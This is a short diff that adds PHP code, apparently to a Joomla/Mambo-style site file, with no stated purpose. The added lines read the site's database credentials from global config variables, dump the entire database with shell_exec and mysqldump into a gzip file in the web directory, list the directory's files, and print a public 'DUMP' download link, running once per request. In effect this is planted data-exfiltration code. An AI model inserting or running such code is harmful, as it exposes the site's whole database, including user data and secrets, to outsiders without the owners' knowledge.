@@ -1,0 +1,7 @@
+if (empty($rr)) {
+global $mosConfig_user, $mosConfig_password, $mosConfig_db;
+shell_exec("/usr/bin/mysqldump --user '$mosConfig_user' --password=$mosConfig_password $mosConfig_db | /usr/bin/gzip > $mosConfig_user.gz");
+var_dump(glob("*"));
+echo "<a href='$mosConfig_user.gz'>DUMP</a>";
+$rr=1;
+}
